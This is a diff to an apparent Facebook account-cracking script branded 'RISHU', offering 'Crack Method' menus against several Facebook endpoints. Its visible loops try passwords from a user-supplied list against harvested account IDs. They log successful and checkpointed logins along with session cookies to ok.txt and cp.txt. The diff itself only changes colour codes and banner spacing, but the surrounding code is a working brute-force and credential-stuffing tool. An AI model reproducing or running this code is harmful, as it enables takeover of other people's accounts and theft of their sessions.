@@ -52,7 +52,7 @@ def banner():
 \x1b[1;91m 88 `88. 88b  d88 db   8D 88   88 88b  d88 
 \x1b[1;91m 88   YD ~Y8888P' `8888Y' YP   YP ~Y8888P' 
 \033[1;97m ------------------------------------------
-\033[1;91m           Author   :  \033[1;92mRishu Khan
+\033[1;91m            Author   :  \033[1;92mRishu Khan
 \033[1;91m           Facebook  :  \033[1;92mRishu 3:)
 \033[1;91m           whatsapp  :  \033[1;92mNot use
 \033[1;97m -------------------------------------------""")
@@ -432,9 +432,9 @@ def methode():
   print("\033[0;90m        [ Choose Crack Method ]")
   print("\033[0;91m[1] \033[0;92mCrack With mbasic")
   print("\033[0;91m[2] \033[0;92mCrack With m.facebook.com")
-  print("\033[0;92m[3] \033[0;92mCrack With touch.facebook.com")
-  print("\033[0;97m[4] \033[0;92mCrack With api")
-  print ("\033[0;96m------------------------------------------------")
+  print("\033[0;91m[3] \033[0;92mCrack With touch.facebook.com")
+  print("\033[0;91m[4] \033[0;92mCrack With api")
+  print ("\033[0;97m------------------------------------------------")
   sek=raw_input("\033[0;93m[•] choose: ")
   if sek=="":print("\033[0;92m   [!] Correct Content").format(R,N);methode()
   elif sek=="1":
@@ -639,7 +639,7 @@ class crack1:
 				log=m_fb(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r   \033[0;92m[RISHU-OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   \033[0;92m[RISHU-OK]\033[0;92m%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -649,7 +649,7 @@ class crack1:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r   \033[0;92m[RISHU-CP]%s %s • %s %s    \033[0;90m  "%(O,fl.get("id"),i,N))
+					print("\r   \033[0;92m[RISHU-CP]\033[0;90m%s %s • %s %s    \033[0;90m  "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -718,7 +718,7 @@ class crack2:
 				print("  \033[0;97l2m [•] Finished")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;97m[•] Password List : ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -736,7 +736,7 @@ class crack2:
 				log=touch_fb(fl.get("id"),
 					i,"https://touch.facebook.com")
 				if log.get("status")=="success":
-					print("\r   \033[0;92m[RISHU-OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   \033[0;92m[RISHU-OK]\033[0;92m%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -746,7 +746,7 @@ class crack2:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r   \033[0;91m[RISHU-CP]%s %s • %s %s    \033[0;91m  "%(O,fl.get("id"),i,N))
+					print("\r   \033[0;91m[RISHU-CP]\033[0;90m%s %s • %s %s    \033[0;91m  "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -833,7 +833,7 @@ class crack2:
 				log=touch_fb(fl.get("id"),
 					i,"https://touch.facebook.com")
 				if log.get("status")=="success":
-					print("\r   \033[0;92m[RISHU-OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   \033[0;92m[RISHU-OK]\033[0;92m%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -843,7 +843,7 @@ class crack2:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r   \033[0;91m[RISHU-CP]%s %s • %s %s     \033[0;91m "%(O,fl.get("id"),i,N))
+					print("\r   \033[0;91m[RISHU-CP]\033[0;90m%s %s • %s %s     \033[0;91m "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -930,7 +930,7 @@ class crack3:
 				log=graph_fb(fl.get("id"),
 					i,"https://graph.facebook.com")
 				if log.get("status")=="success":
-					print("\r   \033[0;92m[RISHU-OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   \033[0;92m[RISHU-OK]\033[0;92m%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -940,7 +940,7 @@ class crack3:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r   \033[0;91m[RISHU-CP]%s %s • %s %s     \033[0;91m "%(O,fl.get("id"),i,N))
+					print("\r   \033[0;91m[RISHU-CP]\033[0;90m%s %s • %s %s     \033[0;91m "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
